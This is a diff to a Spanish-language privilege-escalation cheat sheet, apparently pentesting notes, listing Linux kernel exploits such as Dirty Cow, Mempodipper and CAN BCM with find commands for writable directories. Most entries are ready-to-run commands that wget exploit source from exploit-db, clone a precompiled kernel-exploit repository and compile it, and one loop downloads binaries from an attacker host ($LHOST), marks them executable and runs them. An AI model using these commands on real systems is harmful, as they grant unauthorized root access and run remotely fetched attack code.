@@ -22,12 +22,12 @@
 
 8) Listar directorios con permisos de lectura, escritura y ejecución --> 
 <pre>
-W   `find / -writable -type d 2>/dev/null`
-W   `find / -perm -222 -type d 2>/dev/null`
-W   `find / -perm -o w -type d 2>/dev/null`     # world-writeable folders
-X   `find / -perm -o x -type d 2>/dev/null`     # world-executable folders
-W+X `find / \( -perm -o w -perm -o x \) -type d 2>/dev/null`  
-R `find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print`
+Permisos de W    -->  find / -writable -type d 2>/dev/null
+Permisos de W    -->  find / -perm -222 -type d 2>/dev/null
+Permisos de W    -->  find / -perm -o w -type d 2>/dev/null    
+Permisos de X    -->  find / -perm -o x -type d 2>/dev/null
+Permisos de W+X  -->  find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+Permisos de R    -->  find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
 </pre>
 
 
@@ -60,17 +60,25 @@ R `find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print`
 
 ## Exploits satisfactorios
 
-19) __CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8__ https://www.exploit-db.com/exploits/15285
+19) __Exploits precompilados para Linux__ https://github.com/lucyoa/kernel-exploits  `git clone https://github.com/lucyoa/kernel-exploits.git` 
 
-20) __Linux Kernel <= 2.6.37 'Full-Nelson.c'__ https://www.exploit-db.com/exploits/15704/
+20) __CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8__ https://www.exploit-db.com/exploits/15285
 
-21) __CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)__ https://git.zx2c4.com/CVE-2012-0056/about/
+21) __Linux Kernel <= 2.6.37 'Full-Nelson.c'__ https://www.exploit-db.com/exploits/15704/
 
-22) __Linux CVE 2012-0056__ `wget -O mem.c http://www.exploit-db.com/download/18411; gcc -o mem mem.c`
+22) __CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)__ https://git.zx2c4.com/CVE-2012-0056/about/
 
-23) __CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8__ https://dirtycow.ninja/ `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`
+23) __Linux CVE 2012-0056__ `wget -O mem.c http://www.exploit-db.com/download/18411; gcc -o mem mem.c`
+
+24) __CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8__ https://dirtycow.ninja/ `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`
 `wget https://www.exploit-db.com/download/40839 -O dirty.c; gcc -pthread dirty.c -o dirty -lcrypt`
 
-24) __Linux 2.6.32__ https://www.exploit-db.com/exploits/15285/ 
+25) __Linux 2.6.32__ https://www.exploit-db.com/exploits/15285/ 
 
-26) __Elevation in 2.6.x__ `for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://$LHOST/$a; chmod +x $a; ./$a; id; done`
+26) __CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)__ 
+<pre>
+wget -O 14814.c http://www.exploit-db.com/download/14814
+gcc 14814.c -o can
+</pre>
+
+27) __Elevation in 2.6.x__ `for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://$LHOST/$a; chmod +x $a; ./$a; id; done`
